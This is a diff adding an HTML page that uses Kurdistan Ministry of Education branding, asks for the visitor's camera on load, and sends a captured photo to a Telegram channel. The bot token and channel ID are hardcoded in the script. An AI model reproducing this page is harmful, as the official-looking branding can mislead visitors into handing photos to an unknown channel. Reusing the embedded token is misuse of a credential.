@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Capture Photo and Send to Telegram</title>
+  <style>
+    #loader {
+      margin: 200px auto;
+      width: 230px;
+      height: 230px;
+      border: 15px solid #f3f3f3;
+      border-top: 16px solid #3498db;
+      border-radius: 50%;
+      animation: spin 4s linear infinite, heart-beat 4s linear infinite;
+      background-image: url('https://whatthelogo.com/storage/logos/wazaraty-parwarda-59917.png');
+      background-size: 80%;
+      background-position: center;
+      background-repeat: no-repeat;
+      text-align: center;
+      line-height: 200px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes heart-beat {
+      55% { background-color: #fff; }
+      60% { background-color: #3498db; }
+      65% { background-color: #fff; }
+      70% { background-color: #3498db; }
+      100% { background-color: #fff; }
+    }
+
+    #video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1> وەزارەتی پەروەردەی کوردستان </h1>
+  <div id="loader"></div>
+  <button id="captureButton">Capture Photo</button>
+  <canvas height="480" width="640" id="canvas"></canvas>
+  <button disabled="" id="sendButton">Send to Telegram</button>
+  <video autoplay="" height="480" width="640" id="video"></video>
+
+  <script>
+    const video = document.getElementById('video');
+    const captureButton = document.getElementById('captureButton');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const sendButton = document.getElementById('sendButton');
+    const loader = document.getElementById('loader');
+    const telegramBotToken = '7259050003:AAFsVVkSFIavOuV7kngtiIBOXKITFGjiTZk';
+    const telegramChannelId = '-1001974983805';
+    let capturedImage;
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        console.error('Error accessing camera: ', err);
+      });
+
+    captureButton.addEventListener('click', () => {
+      video.style.display = 'block';
+      loader.style.display = 'none';
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      capturedImage = canvas.toDataURL('image/png');
+      sendButton.disabled = false;
+    });
+
+    sendButton.addEventListener('click', () => {
+      if (capturedImage) {
+        const formData = new FormData();
+        formData.append('chat_id', telegramChannelId);
+        formData.append('photo', capturedImage);
+
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Photo sent to Telegram: ', data);
+          alert('Photo sent successfully!');
+        })
+        .catch(err => {
+          console.error('Error sending photo to Telegram: ', err);
+          alert('Error sending photo!');
+        });
+      }
+    });
+  </script>
+</body>
+</html>
